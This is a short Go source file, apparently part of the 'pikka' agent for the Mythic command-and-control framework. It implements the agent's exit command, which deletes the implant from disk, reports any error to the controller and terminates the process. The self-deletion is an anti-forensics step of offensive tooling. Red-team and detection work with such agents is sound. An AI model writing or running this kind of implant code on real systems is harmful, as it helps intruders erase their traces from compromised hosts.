package exit

import (
	// Standard
	"os"

	"github.com/MythicAgents/pikka/Payload_Type/pikka/agent_code/pkg/utils/structs"
)

func Run(task structs.Task) {
	msg := task.NewResponse()

	if err := selfDelete(); err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
	}

	os.Exit(0)
}
